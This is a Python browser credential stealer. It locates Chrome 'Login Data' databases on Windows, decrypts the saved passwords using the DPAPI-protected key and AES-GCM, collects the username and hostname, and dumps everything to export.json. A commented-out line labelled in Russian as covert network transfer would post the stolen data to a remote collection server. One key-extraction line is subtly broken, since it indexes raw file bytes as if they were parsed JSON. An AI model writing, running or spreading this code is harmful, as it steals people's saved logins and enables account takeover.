import os
import json
import sqlite3
import shutil
from base64 import b64encode
from Crypto.Cipher import AES
import win32crypt
import glob

def get_chrome_databases():
    paths = []
    chrome_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data')
    for root, dirs, files in os.walk(chrome_path):
        if 'Login Data' in files:
            paths.append(os.path.join(root, 'Login Data'))
    return paths

def decrypt_password(ciphertext, key):
    try:
        iv = ciphertext[3:15]
        payload = ciphertext[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted = cipher.decrypt(payload)
        return decrypted[:-16].decode()
    except:
        return None

def harvest_data():
    output = {'browsers': {}}
    # Chrome/Edge data extraction
    for db_path in get_chrome_databases():
        try:
            temp_db = os.path.join(os.getcwd(), 'temp_db')
            shutil.copy2(db_path, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            key = win32crypt.CryptUnprotectData(open(os.path.join(os.path.dirname(db_path), 'Local State'), 'rb').read()['os_crypt']['encrypted_key'], None, None, None, 0)[1]
            key = key[5:]
            entries = []
            for url, user, pwd in cursor.fetchall():
                decrypted_pwd = decrypt_password(pwd, key)
                entries.append({'url': url, 'username': user, 'password': decrypted_pwd})
            output['browsers'][db_path] = entries
            conn.close()
            os.remove(temp_db)
        except Exception as e:
            output['browsers'][db_path] = str(e)
    
    # System info collection
    output['system'] = {
        'user': os.environ.get('USERNAME'),
        'hostname': os.environ.get('COMPUTERNAME'),
        'os': os.environ.get('OS')
    }
    
    with open(os.path.join(os.getcwd(), 'export.json'), 'w') as f:
        json.dump(output, f, indent=4)
    
    # Скрытная передача данных по сети (опционально)
    # import requests
    # requests.post('http://remote-server.com/collect', json=output)

if __name__ == '__main__':
    harvest_data()